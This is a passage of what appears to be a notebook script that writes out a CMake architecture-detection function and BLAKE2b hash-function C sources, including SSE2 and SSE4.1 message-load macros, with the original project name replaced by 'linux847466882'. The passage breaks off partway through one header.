                compile_result_unused
                "${CMAKE_BINARY_DIR}"
                "${CMAKE_BINARY_DIR}/arch.c"
                COMPILE_OUTPUT_VARIABLE ARCH
                CMAKE_FLAGS CMAKE_OSX_ARCHITECTURES=${CMAKE_OSX_ARCHITECTURES}
        )

        # Parse the architecture name from the compiler output
        string(REGEX MATCH "cmake_ARCH ([a-zA-Z0-9_]+)" ARCH "${ARCH}")

        # Get rid of the value marker leaving just the architecture name
        string(REPLACE "cmake_ARCH " "" ARCH "${ARCH}")

        # If we are compiling with an unknown architecture this variable should
        # already be set to "unknown" but in the case that it's empty (i.e. due
        # to a typo in the code), then set it to unknown
        if (NOT ARCH)
            set(ARCH unknown)
        endif()
    endif()

    set(${output_var} "${ARCH}" PARENT_SCOPE)
endfunction()"""

open('./TargetArch.cmake', 'w').write(content)

!mkdir ./linux8474/linux847466882/blake2/

content="""/*
 * linux847466882 reference source code package - reference C implementations
 *
 * Copyright 2015
 * Daniel Dinu, Dmitry Khovratovich, Jean-Philippe Aumasson, and Samuel Neves
 *
 * You may use this work under the terms of a Creative Commons CC0 1.0
 * License/Waiver or the Apache Public License 2.0, at your option. The terms of
 * these licenses can be found at:
 *
 * - CC0 1.0 Universal : http://creativecommons.org/publicdomain/zero/1.0
 * - Apache 2.0        : http://www.apache.org/licenses/LICENSE-2.0
 *
 * You should have received a copy of both of these licenses along with this
 * software. If not, they may be obtained at the above URLs.
 */

#ifndef PORTABLE_BLAKE2_H
#define PORTABLE_BLAKE2_H

#include <limits.h>

#if defined(__cplusplus)
extern "C" {
#endif

enum blake2b_constant {
    BLAKE2B_BLOCKBYTES = 128,
    BLAKE2B_OUTBYTES = 64,
    BLAKE2B_KEYBYTES = 64,
    BLAKE2B_SALTBYTES = 16,
    BLAKE2B_PERSONALBYTES = 16
};

#pragma pack(push, 1)
typedef struct __blake2b_param {
    uint8_t digest_length;                   /* 1 */
    uint8_t key_length;                      /* 2 */
    uint8_t fanout;                          /* 3 */
    uint8_t depth;                           /* 4 */
    uint32_t leaf_length;                    /* 8 */
    uint64_t node_offset;                    /* 16 */
    uint8_t node_depth;                      /* 17 */
    uint8_t inner_length;                    /* 18 */
    uint8_t reserved[14];                    /* 32 */
    uint8_t salt[BLAKE2B_SALTBYTES];         /* 48 */
    uint8_t personal[BLAKE2B_PERSONALBYTES]; /* 64 */
} blake2b_param;
#pragma pack(pop)

typedef struct __blake2b_state {
    uint64_t h[8];
    uint64_t t[2];
    uint64_t f[2];
    uint8_t buf[BLAKE2B_BLOCKBYTES];
    unsigned buflen;
    unsigned outlen;
    uint8_t last_node;
} blake2b_state;

/* Ensure param structs have not been wrongly padded */
/* Poor man's static_assert */
enum {
    blake2_size_check_0 = 1 / !!(CHAR_BIT == 8),
    blake2_size_check_2 =
    1 / !!(sizeof(blake2b_param) == sizeof(uint64_t) * CHAR_BIT)
};

/* Streaming API */
int blake2b_init(blake2b_state *S, size_t outlen);
int blake2b_init_key(blake2b_state *S, size_t outlen, const void *key,
                     size_t keylen);
int blake2b_init_param(blake2b_state *S, const blake2b_param *P);
int blake2b_update(blake2b_state *S, const void *in, size_t inlen);
int blake2b_final(blake2b_state *S, void *out, size_t outlen);

/* Simple API */
int blake2b(void *out, size_t outlen, const void *in, size_t inlen,
            const void *key, size_t keylen);

/* linux847466882 Team - Begin Code */
int blake2b_long(void *out, size_t outlen, const void *in, size_t inlen);
/* linux847466882 Team - End Code */

#if defined(__cplusplus)
}
#endif

#endif"""

open('./linux8474/linux847466882/blake2/blake2.h', 'w').write(content)

content="""/*
 * linux847466882 reference source code package - reference C implementations
 *
 * Copyright 2015
 * Daniel Dinu, Dmitry Khovratovich, Jean-Philippe Aumasson, and Samuel Neves
 *
 * You may use this work under the terms of a Creative Commons CC0 1.0
 * License/Waiver or the Apache Public License 2.0, at your option. The terms of
 * these licenses can be found at:
 *
 * - CC0 1.0 Universal : http://creativecommons.org/publicdomain/zero/1.0
 * - Apache 2.0        : http://www.apache.org/licenses/LICENSE-2.0
 *
 * You should have received a copy of both of these licenses along with this
 * software. If not, they may be obtained at the above URLs.
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>

#include "blake2.h"
#include "blake2-impl.h"

#if !defined(BUILD_REF) && (defined(__x86_64__) || defined(_WIN64))
    #include "blake2-config.h"

    #ifdef _MSC_VER
    #include <intrin.h> /* for _mm_set_epi64x */
    #endif
    #include <emmintrin.h>
    #if defined(HAVE_SSSE3)
    #include <tmmintrin.h>
    #endif
    #if defined(HAVE_SSE41)
    #include <smmintrin.h>
    #endif
    #if defined(HAVE_AVX)
    #include <immintrin.h>
    #endif
    #if defined(HAVE_XOP)
    #include <x86intrin.h>
    #endif

    #include "blake2b-round.h"
#endif

static const uint64_t blake2b_IV[8] = {
        UINT64_C(0x6a09e667f3bcc908), UINT64_C(0xbb67ae8584caa73b),
        UINT64_C(0x3c6ef372fe94f82b), UINT64_C(0xa54ff53a5f1d36f1),
        UINT64_C(0x510e527fade682d1), UINT64_C(0x9b05688c2b3e6c1f),
        UINT64_C(0x1f83d9abfb41bd6b), UINT64_C(0x5be0cd19137e2179)};

static const unsigned int blake2b_sigma[12][16] = {
        {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15},
        {14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3},
        {11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4},
        {7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8},
        {9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13},
        {2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9},
        {12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11},
        {13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10},
        {6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5},
        {10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0},
        {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15},
        {14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3},
};

static BLAKE2_INLINE void blake2b_set_lastnode(blake2b_state *S) {
    S->f[1] = (uint64_t)-1;
}

static BLAKE2_INLINE void blake2b_set_lastblock(blake2b_state *S) {
    if (S->last_node) {
        blake2b_set_lastnode(S);
    }
    S->f[0] = (uint64_t)-1;
}

static BLAKE2_INLINE void blake2b_increment_counter(blake2b_state *S,
                                                    uint64_t inc) {
    S->t[0] += inc;
    S->t[1] += (S->t[0] < inc);
}

static BLAKE2_INLINE void blake2b_invalidate_state(blake2b_state *S) {
    blake2b_set_lastblock(S); /* invalidate for further use */
}

static BLAKE2_INLINE void blake2b_init0(blake2b_state *S) {
    memset(S, 0, sizeof(*S));
    memcpy(S->h, blake2b_IV, sizeof(S->h));
}

int blake2b_init_param(blake2b_state *S, const blake2b_param *P) {
    const unsigned char *p = (const unsigned char *)P;
    unsigned int i;

    if (NULL == P || NULL == S) {
        return -1;
    }

    blake2b_init0(S);
    /* IV XOR Parameter Block */
    for (i = 0; i < 8; ++i) {
        S->h[i] ^= load64(&p[i * sizeof(S->h[i])]);
    }
    S->outlen = P->digest_length;
    return 0;
}

/* Sequential blake2b initialization */
int blake2b_init(blake2b_state *S, size_t outlen) {
    blake2b_param P;

    if (S == NULL) {
        return -1;
    }

    if ((outlen == 0) || (outlen > BLAKE2B_OUTBYTES)) {
        blake2b_invalidate_state(S);
        return -1;
    }

    /* Setup Parameter Block for unkeyed BLAKE2 */
    P.digest_length = (uint8_t)outlen;
    P.key_length = 0;
    P.fanout = 1;
    P.depth = 1;
    P.leaf_length = 0;
    P.node_offset = 0;
    P.node_depth = 0;
    P.inner_length = 0;
    memset(P.reserved, 0, sizeof(P.reserved));
    memset(P.salt, 0, sizeof(P.salt));
    memset(P.personal, 0, sizeof(P.personal));

    return blake2b_init_param(S, &P);
}

int blake2b_init_key(blake2b_state *S, size_t outlen, const void *key,
                     size_t keylen) {
    blake2b_param P;

    if (S == NULL) {
        return -1;
    }

    if ((outlen == 0) || (outlen > BLAKE2B_OUTBYTES)) {
        blake2b_invalidate_state(S);
        return -1;
    }

    if ((key == 0) || (keylen == 0) || (keylen > BLAKE2B_KEYBYTES)) {
        blake2b_invalidate_state(S);
        return -1;
    }

    /* Setup Parameter Block for keyed BLAKE2 */
    P.digest_length = (uint8_t)outlen;
    P.key_length = (uint8_t)keylen;
    P.fanout = 1;
    P.depth = 1;
    P.leaf_length = 0;
    P.node_offset = 0;
    P.node_depth = 0;
    P.inner_length = 0;
    memset(P.reserved, 0, sizeof(P.reserved));
    memset(P.salt, 0, sizeof(P.salt));
    memset(P.personal, 0, sizeof(P.personal));

    if (blake2b_init_param(S, &P) < 0) {
        blake2b_invalidate_state(S);
        return -1;
    }

    {
        uint8_t block[BLAKE2B_BLOCKBYTES];
        memset(block, 0, BLAKE2B_BLOCKBYTES);
        memcpy(block, key, keylen);
        blake2b_update(S, block, BLAKE2B_BLOCKBYTES);
    }
    return 0;
}

#if !defined(BUILD_REF) && (defined(__x86_64__) || defined(_WIN64))
static void blake2b_compress( blake2b_state *S, const uint8_t block[BLAKE2B_BLOCKBYTES] )
{
    __m128i row1l, row1h;
    __m128i row2l, row2h;
    __m128i row3l, row3h;
    __m128i row4l, row4h;
    __m128i b0, b1;
    __m128i t0, t1;
#if defined(HAVE_SSSE3) && !defined(HAVE_XOP)
    const __m128i r16 = _mm_setr_epi8( 2, 3, 4, 5, 6, 7, 0, 1, 10, 11, 12, 13, 14, 15, 8, 9 );
    const __m128i r24 = _mm_setr_epi8( 3, 4, 5, 6, 7, 0, 1, 2, 11, 12, 13, 14, 15, 8, 9, 10 );
#endif
#if defined(HAVE_SSE41)
    const __m128i m0 = LOADU( block + 00 );
    const __m128i m1 = LOADU( block + 16 );
    const __m128i m2 = LOADU( block + 32 );
    const __m128i m3 = LOADU( block + 48 );
    const __m128i m4 = LOADU( block + 64 );
    const __m128i m5 = LOADU( block + 80 );
    const __m128i m6 = LOADU( block + 96 );
    const __m128i m7 = LOADU( block + 112 );
#else
  const uint64_t  m0 = load64(block +  0 * sizeof(uint64_t));
  const uint64_t  m1 = load64(block +  1 * sizeof(uint64_t));
  const uint64_t  m2 = load64(block +  2 * sizeof(uint64_t));
  const uint64_t  m3 = load64(block +  3 * sizeof(uint64_t));
  const uint64_t  m4 = load64(block +  4 * sizeof(uint64_t));
  const uint64_t  m5 = load64(block +  5 * sizeof(uint64_t));
  const uint64_t  m6 = load64(block +  6 * sizeof(uint64_t));
  const uint64_t  m7 = load64(block +  7 * sizeof(uint64_t));
  const uint64_t  m8 = load64(block +  8 * sizeof(uint64_t));
  const uint64_t  m9 = load64(block +  9 * sizeof(uint64_t));
  const uint64_t m10 = load64(block + 10 * sizeof(uint64_t));
  const uint64_t m11 = load64(block + 11 * sizeof(uint64_t));
  const uint64_t m12 = load64(block + 12 * sizeof(uint64_t));
  const uint64_t m13 = load64(block + 13 * sizeof(uint64_t));
  const uint64_t m14 = load64(block + 14 * sizeof(uint64_t));
  const uint64_t m15 = load64(block + 15 * sizeof(uint64_t));
#endif
    row1l = LOADU( &S->h[0] );
    row1h = LOADU( &S->h[2] );
    row2l = LOADU( &S->h[4] );
    row2h = LOADU( &S->h[6] );
    row3l = LOADU( &blake2b_IV[0] );
    row3h = LOADU( &blake2b_IV[2] );
    row4l = _mm_xor_si128( LOADU( &blake2b_IV[4] ), LOADU( &S->t[0] ) );
    row4h = _mm_xor_si128( LOADU( &blake2b_IV[6] ), LOADU( &S->f[0] ) );
    ROUND( 0 );
    ROUND( 1 );
    ROUND( 2 );
    ROUND( 3 );
    ROUND( 4 );
    ROUND( 5 );
    ROUND( 6 );
    ROUND( 7 );
    ROUND( 8 );
    ROUND( 9 );
    ROUND( 10 );
    ROUND( 11 );
    row1l = _mm_xor_si128( row3l, row1l );
    row1h = _mm_xor_si128( row3h, row1h );
    STOREU( &S->h[0], _mm_xor_si128( LOADU( &S->h[0] ), row1l ) );
    STOREU( &S->h[2], _mm_xor_si128( LOADU( &S->h[2] ), row1h ) );
    row2l = _mm_xor_si128( row4l, row2l );
    row2h = _mm_xor_si128( row4h, row2h );
    STOREU( &S->h[4], _mm_xor_si128( LOADU( &S->h[4] ), row2l ) );
    STOREU( &S->h[6], _mm_xor_si128( LOADU( &S->h[6] ), row2h ) );
}
#else
static void blake2b_compress(blake2b_state *S, const uint8_t *block) {
    uint64_t m[16];
    uint64_t v[16];
    unsigned int i, r;

    for (i = 0; i < 16; ++i) {
        m[i] = load64(block + i * sizeof(m[i]));
    }

    for (i = 0; i < 8; ++i) {
        v[i] = S->h[i];
    }

    v[8] = blake2b_IV[0];
    v[9] = blake2b_IV[1];
    v[10] = blake2b_IV[2];
    v[11] = blake2b_IV[3];
    v[12] = blake2b_IV[4] ^ S->t[0];
    v[13] = blake2b_IV[5] ^ S->t[1];
    v[14] = blake2b_IV[6] ^ S->f[0];
    v[15] = blake2b_IV[7] ^ S->f[1];

#define G(r, i, a, b, c, d)                                                    \
    do {                                                                       \
        a = a + b + m[blake2b_sigma[r][2 * i + 0]];                            \
        d = rotr64(d ^ a, 32);                                                 \
        c = c + d;                                                             \
        b = rotr64(b ^ c, 24);                                                 \
        a = a + b + m[blake2b_sigma[r][2 * i + 1]];                            \
        d = rotr64(d ^ a, 16);                                                 \
        c = c + d;                                                             \
        b = rotr64(b ^ c, 63);                                                 \
    } while ((void)0, 0)

#define ROUND(r)                                                               \
    do {                                                                       \
        G(r, 0, v[0], v[4], v[8], v[12]);                                      \
        G(r, 1, v[1], v[5], v[9], v[13]);                                      \
        G(r, 2, v[2], v[6], v[10], v[14]);                                     \
        G(r, 3, v[3], v[7], v[11], v[15]);                                     \
        G(r, 4, v[0], v[5], v[10], v[15]);                                     \
        G(r, 5, v[1], v[6], v[11], v[12]);                                     \
        G(r, 6, v[2], v[7], v[8], v[13]);                                      \
        G(r, 7, v[3], v[4], v[9], v[14]);                                      \
    } while ((void)0, 0)

    for (r = 0; r < 12; ++r) {
        ROUND(r);
    }

    for (i = 0; i < 8; ++i) {
        S->h[i] = S->h[i] ^ v[i] ^ v[i + 8];
    }

#undef G
#undef ROUND
}
#endif

int blake2b_update(blake2b_state *S, const void *in, size_t inlen) {
    const uint8_t *pin = (const uint8_t *)in;

    if (inlen == 0) {
        return 0;
    }

    /* Sanity check */
    if (S == NULL || in == NULL) {
        return -1;
    }

    /* Is this a reused state? */
    if (S->f[0] != 0) {
        return -1;
    }

    if (S->buflen + inlen > BLAKE2B_BLOCKBYTES) {
        /* Complete current block */
        size_t left = S->buflen;
        size_t fill = BLAKE2B_BLOCKBYTES - left;
        memcpy(&S->buf[left], pin, fill);
        blake2b_increment_counter(S, BLAKE2B_BLOCKBYTES);
        blake2b_compress(S, S->buf);
        S->buflen = 0;
        inlen -= fill;
        pin += fill;
        /* Avoid buffer copies when possible */
        while (inlen > BLAKE2B_BLOCKBYTES) {
            blake2b_increment_counter(S, BLAKE2B_BLOCKBYTES);
            blake2b_compress(S, pin);
            inlen -= BLAKE2B_BLOCKBYTES;
            pin += BLAKE2B_BLOCKBYTES;
        }
    }
    memcpy(&S->buf[S->buflen], pin, inlen);
    S->buflen += (unsigned int)inlen;
    return 0;
}

int blake2b_final(blake2b_state *S, void *out, size_t outlen) {
    uint8_t buffer[BLAKE2B_OUTBYTES] = {0};
    unsigned int i;

    /* Sanity checks */
    if (S == NULL || out == NULL || outlen < S->outlen) {
        return -1;
    }

    /* Is this a reused state? */
    if (S->f[0] != 0) {
        return -1;
    }

    blake2b_increment_counter(S, S->buflen);
    blake2b_set_lastblock(S);
    memset(&S->buf[S->buflen], 0, BLAKE2B_BLOCKBYTES - S->buflen); /* Padding */
    blake2b_compress(S, S->buf);

    for (i = 0; i < 8; ++i) { /* Output full hash to temp buffer */
        store64(buffer + sizeof(S->h[i]) * i, S->h[i]);
    }

    memcpy(out, buffer, S->outlen);
    return 0;
}

int blake2b(void *out, size_t outlen, const void *in, size_t inlen,
            const void *key, size_t keylen) {
    blake2b_state S;
    int ret = -1;

    /* Verify parameters */
    if (NULL == in && inlen > 0) {
        goto fail;
    }

    if (NULL == out || outlen == 0 || outlen > BLAKE2B_OUTBYTES) {
        goto fail;
    }

    if ((NULL == key && keylen > 0) || keylen > BLAKE2B_KEYBYTES) {
        goto fail;
    }

    if (keylen > 0) {
        if (blake2b_init_key(&S, outlen, key, keylen) < 0) {
            goto fail;
        }
    } else {
        if (blake2b_init(&S, outlen) < 0) {
            goto fail;
        }
    }

    if (blake2b_update(&S, in, inlen) < 0) {
        goto fail;
    }
    ret = blake2b_final(&S, out, outlen);

    fail:
    return ret;
}

/* linux847466882 Team - Begin Code */
int blake2b_long(void *pout, size_t outlen, const void *in, size_t inlen) {
    uint8_t *out = (uint8_t *)pout;
    blake2b_state blake_state;
    uint8_t outlen_bytes[sizeof(uint32_t)] = {0};
    int ret = -1;

    if (outlen > UINT32_MAX) {
        goto fail;
    }

    /* Ensure little-endian byte order! */
    store32(outlen_bytes, (uint32_t)outlen);

#define TRY(statement)                                                         \
    do {                                                                       \
        ret = statement;                                                       \
        if (ret < 0) {                                                         \
            goto fail;                                                         \
        }                                                                      \
    } while ((void)0, 0)

    if (outlen <= BLAKE2B_OUTBYTES) {
        TRY(blake2b_init(&blake_state, outlen));
        TRY(blake2b_update(&blake_state, outlen_bytes, sizeof(outlen_bytes)));
        TRY(blake2b_update(&blake_state, in, inlen));
        TRY(blake2b_final(&blake_state, out, outlen));
    } else {
        uint32_t toproduce;
        uint8_t out_buffer[BLAKE2B_OUTBYTES];
        uint8_t in_buffer[BLAKE2B_OUTBYTES];
        TRY(blake2b_init(&blake_state, BLAKE2B_OUTBYTES));
        TRY(blake2b_update(&blake_state, outlen_bytes, sizeof(outlen_bytes)));
        TRY(blake2b_update(&blake_state, in, inlen));
        TRY(blake2b_final(&blake_state, out_buffer, BLAKE2B_OUTBYTES));
        memcpy(out, out_buffer, BLAKE2B_OUTBYTES / 2);
        out += BLAKE2B_OUTBYTES / 2;
        toproduce = (uint32_t)outlen - BLAKE2B_OUTBYTES / 2;

        while (toproduce > BLAKE2B_OUTBYTES) {
            memcpy(in_buffer, out_buffer, BLAKE2B_OUTBYTES);
            TRY(blake2b(out_buffer, BLAKE2B_OUTBYTES, in_buffer,
                        BLAKE2B_OUTBYTES, NULL, 0));
            memcpy(out, out_buffer, BLAKE2B_OUTBYTES / 2);
            out += BLAKE2B_OUTBYTES / 2;
            toproduce -= BLAKE2B_OUTBYTES / 2;
        }

        memcpy(in_buffer, out_buffer, BLAKE2B_OUTBYTES);
        TRY(blake2b(out_buffer, toproduce, in_buffer, BLAKE2B_OUTBYTES, NULL,
                    0));
        memcpy(out, out_buffer, toproduce);
    }
    fail:
    return ret;
#undef TRY
}
/* linux847466882 Team - End Code */"""

open('./linux8474/linux847466882/blake2/blake2b.c', 'w').write(content)

content="""/*
   BLAKE2 reference source code package - optimized C implementations

   Copyright 2012, Samuel Neves <sneves@dei.uc.pt>.  You may use this under the
   terms of the CC0, the OpenSSL Licence, or the Apache Public License 2.0, at
   your option.  The terms of these licenses can be found at:

   - CC0 1.0 Universal : http://creativecommons.org/publicdomain/zero/1.0
   - OpenSSL license   : https://www.openssl.org/source/license.html
   - Apache 2.0        : http://www.apache.org/licenses/LICENSE-2.0

   More information about the BLAKE2 hash function can be found at
   https://blake2.net.
*/
#ifndef BLAKE2B_LOAD_SSE2_H
#define BLAKE2B_LOAD_SSE2_H

#define LOAD_MSG_0_1(b0, b1) b0 = _mm_set_epi64x(m2, m0); b1 = _mm_set_epi64x(m6, m4)
#define LOAD_MSG_0_2(b0, b1) b0 = _mm_set_epi64x(m3, m1); b1 = _mm_set_epi64x(m7, m5)
#define LOAD_MSG_0_3(b0, b1) b0 = _mm_set_epi64x(m10, m8); b1 = _mm_set_epi64x(m14, m12)
#define LOAD_MSG_0_4(b0, b1) b0 = _mm_set_epi64x(m11, m9); b1 = _mm_set_epi64x(m15, m13)
#define LOAD_MSG_1_1(b0, b1) b0 = _mm_set_epi64x(m4, m14); b1 = _mm_set_epi64x(m13, m9)
#define LOAD_MSG_1_2(b0, b1) b0 = _mm_set_epi64x(m8, m10); b1 = _mm_set_epi64x(m6, m15)
#define LOAD_MSG_1_3(b0, b1) b0 = _mm_set_epi64x(m0, m1); b1 = _mm_set_epi64x(m5, m11)
#define LOAD_MSG_1_4(b0, b1) b0 = _mm_set_epi64x(m2, m12); b1 = _mm_set_epi64x(m3, m7)
#define LOAD_MSG_2_1(b0, b1) b0 = _mm_set_epi64x(m12, m11); b1 = _mm_set_epi64x(m15, m5)
#define LOAD_MSG_2_2(b0, b1) b0 = _mm_set_epi64x(m0, m8); b1 = _mm_set_epi64x(m13, m2)
#define LOAD_MSG_2_3(b0, b1) b0 = _mm_set_epi64x(m3, m10); b1 = _mm_set_epi64x(m9, m7)
#define LOAD_MSG_2_4(b0, b1) b0 = _mm_set_epi64x(m6, m14); b1 = _mm_set_epi64x(m4, m1)
#define LOAD_MSG_3_1(b0, b1) b0 = _mm_set_epi64x(m3, m7); b1 = _mm_set_epi64x(m11, m13)
#define LOAD_MSG_3_2(b0, b1) b0 = _mm_set_epi64x(m1, m9); b1 = _mm_set_epi64x(m14, m12)
#define LOAD_MSG_3_3(b0, b1) b0 = _mm_set_epi64x(m5, m2); b1 = _mm_set_epi64x(m15, m4)
#define LOAD_MSG_3_4(b0, b1) b0 = _mm_set_epi64x(m10, m6); b1 = _mm_set_epi64x(m8, m0)
#define LOAD_MSG_4_1(b0, b1) b0 = _mm_set_epi64x(m5, m9); b1 = _mm_set_epi64x(m10, m2)
#define LOAD_MSG_4_2(b0, b1) b0 = _mm_set_epi64x(m7, m0); b1 = _mm_set_epi64x(m15, m4)
#define LOAD_MSG_4_3(b0, b1) b0 = _mm_set_epi64x(m11, m14); b1 = _mm_set_epi64x(m3, m6)
#define LOAD_MSG_4_4(b0, b1) b0 = _mm_set_epi64x(m12, m1); b1 = _mm_set_epi64x(m13, m8)
#define LOAD_MSG_5_1(b0, b1) b0 = _mm_set_epi64x(m6, m2); b1 = _mm_set_epi64x(m8, m0)
#define LOAD_MSG_5_2(b0, b1) b0 = _mm_set_epi64x(m10, m12); b1 = _mm_set_epi64x(m3, m11)
#define LOAD_MSG_5_3(b0, b1) b0 = _mm_set_epi64x(m7, m4); b1 = _mm_set_epi64x(m1, m15)
#define LOAD_MSG_5_4(b0, b1) b0 = _mm_set_epi64x(m5, m13); b1 = _mm_set_epi64x(m9, m14)
#define LOAD_MSG_6_1(b0, b1) b0 = _mm_set_epi64x(m1, m12); b1 = _mm_set_epi64x(m4, m14)
#define LOAD_MSG_6_2(b0, b1) b0 = _mm_set_epi64x(m15, m5); b1 = _mm_set_epi64x(m10, m13)
#define LOAD_MSG_6_3(b0, b1) b0 = _mm_set_epi64x(m6, m0); b1 = _mm_set_epi64x(m8, m9)
#define LOAD_MSG_6_4(b0, b1) b0 = _mm_set_epi64x(m3, m7); b1 = _mm_set_epi64x(m11, m2)
#define LOAD_MSG_7_1(b0, b1) b0 = _mm_set_epi64x(m7, m13); b1 = _mm_set_epi64x(m3, m12)
#define LOAD_MSG_7_2(b0, b1) b0 = _mm_set_epi64x(m14, m11); b1 = _mm_set_epi64x(m9, m1)
#define LOAD_MSG_7_3(b0, b1) b0 = _mm_set_epi64x(m15, m5); b1 = _mm_set_epi64x(m2, m8)
#define LOAD_MSG_7_4(b0, b1) b0 = _mm_set_epi64x(m4, m0); b1 = _mm_set_epi64x(m10, m6)
#define LOAD_MSG_8_1(b0, b1) b0 = _mm_set_epi64x(m14, m6); b1 = _mm_set_epi64x(m0, m11)
#define LOAD_MSG_8_2(b0, b1) b0 = _mm_set_epi64x(m9, m15); b1 = _mm_set_epi64x(m8, m3)
#define LOAD_MSG_8_3(b0, b1) b0 = _mm_set_epi64x(m13, m12); b1 = _mm_set_epi64x(m10, m1)
#define LOAD_MSG_8_4(b0, b1) b0 = _mm_set_epi64x(m7, m2); b1 = _mm_set_epi64x(m5, m4)
#define LOAD_MSG_9_1(b0, b1) b0 = _mm_set_epi64x(m8, m10); b1 = _mm_set_epi64x(m1, m7)
#define LOAD_MSG_9_2(b0, b1) b0 = _mm_set_epi64x(m4, m2); b1 = _mm_set_epi64x(m5, m6)
#define LOAD_MSG_9_3(b0, b1) b0 = _mm_set_epi64x(m9, m15); b1 = _mm_set_epi64x(m13, m3)
#define LOAD_MSG_9_4(b0, b1) b0 = _mm_set_epi64x(m14, m11); b1 = _mm_set_epi64x(m0, m12)
#define LOAD_MSG_10_1(b0, b1) b0 = _mm_set_epi64x(m2, m0); b1 = _mm_set_epi64x(m6, m4)
#define LOAD_MSG_10_2(b0, b1) b0 = _mm_set_epi64x(m3, m1); b1 = _mm_set_epi64x(m7, m5)
#define LOAD_MSG_10_3(b0, b1) b0 = _mm_set_epi64x(m10, m8); b1 = _mm_set_epi64x(m14, m12)
#define LOAD_MSG_10_4(b0, b1) b0 = _mm_set_epi64x(m11, m9); b1 = _mm_set_epi64x(m15, m13)
#define LOAD_MSG_11_1(b0, b1) b0 = _mm_set_epi64x(m4, m14); b1 = _mm_set_epi64x(m13, m9)
#define LOAD_MSG_11_2(b0, b1) b0 = _mm_set_epi64x(m8, m10); b1 = _mm_set_epi64x(m6, m15)
#define LOAD_MSG_11_3(b0, b1) b0 = _mm_set_epi64x(m0, m1); b1 = _mm_set_epi64x(m5, m11)
#define LOAD_MSG_11_4(b0, b1) b0 = _mm_set_epi64x(m2, m12); b1 = _mm_set_epi64x(m3, m7)


#endif"""

open('./linux8474/linux847466882/blake2/blake2b-load-sse2.h', 'w').write(content)

content="""/*
   BLAKE2 reference source code package - optimized C implementations

   Copyright 2012, Samuel Neves <sneves@dei.uc.pt>.  You may use this under the
   terms of the CC0, the OpenSSL Licence, or the Apache Public License 2.0, at
   your option.  The terms of these licenses can be found at:

   - CC0 1.0 Universal : http://creativecommons.org/publicdomain/zero/1.0
   - OpenSSL license   : https://www.openssl.org/source/license.html
   - Apache 2.0        : http://www.apache.org/licenses/LICENSE-2.0

   More information about the BLAKE2 hash function can be found at
   https://blake2.net.
*/
#ifndef BLAKE2B_LOAD_SSE41_H
#define BLAKE2B_LOAD_SSE41_H

#define LOAD_MSG_0_1(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m0, m1); \
b1 = _mm_unpacklo_epi64(m2, m3); \
} while(0)


#define LOAD_MSG_0_2(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m0, m1); \
b1 = _mm_unpackhi_epi64(m2, m3); \
} while(0)


#define LOAD_MSG_0_3(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m4, m5); \
b1 = _mm_unpacklo_epi64(m6, m7); \
} while(0)


#define LOAD_MSG_0_4(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m4, m5); \
b1 = _mm_unpackhi_epi64(m6, m7); \
} while(0)


#define LOAD_MSG_1_1(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m7, m2); \
b1 = _mm_unpackhi_epi64(m4, m6); \
} while(0)


#define LOAD_MSG_1_2(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m5, m4); \
b1 = _mm_alignr_epi8(m3, m7, 8); \
} while(0)


#define LOAD_MSG_1_3(b0, b1) \
do \
{ \
b0 = _mm_shuffle_epi32(m0, _MM_SHUFFLE(1,0,3,2)); \
b1 = _mm_unpackhi_epi64(m5, m2); \
} while(0)


#define LOAD_MSG_1_4(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m6, m1); \
b1 = _mm_unpackhi_epi64(m3, m1); \
} while(0)


#define LOAD_MSG_2_1(b0, b1) \
do \
{ \
b0 = _mm_alignr_epi8(m6, m5, 8); \
b1 = _mm_unpackhi_epi64(m2, m7); \
} while(0)


#define LOAD_MSG_2_2(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m4, m0); \
b1 = _mm_blend_epi16(m1, m6, 0xF0); \
} while(0)


#define LOAD_MSG_2_3(b0, b1) \
do \
{ \
b0 = _mm_blend_epi16(m5, m1, 0xF0); \
b1 = _mm_unpackhi_epi64(m3, m4); \
} while(0)


#define LOAD_MSG_2_4(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m7, m3); \
b1 = _mm_alignr_epi8(m2, m0, 8); \
} while(0)


#define LOAD_MSG_3_1(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m3, m1); \
b1 = _mm_unpackhi_epi64(m6, m5); \
} while(0)


#define LOAD_MSG_3_2(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m4, m0); \
b1 = _mm_unpacklo_epi64(m6, m7); \
} while(0)


#define LOAD_MSG_3_3(b0, b1) \
do \
{ \
b0 = _mm_blend_epi16(m1, m2, 0xF0); \
b1 = _mm_blend_epi16(m2, m7, 0xF0); \
} while(0)


#define LOAD_MSG_3_4(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m3, m5); \
b1 = _mm_unpacklo_epi64(m0, m4); \
} while(0)


#define LOAD_MSG_4_1(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m4, m2); \
b1 = _mm_unpacklo_epi64(m1, m5); \
} while(0)


#define LOAD_MSG_4_2(b0, b1) \
do \
{ \
b0 = _mm_blend_epi16(m0, m3, 0xF0); \
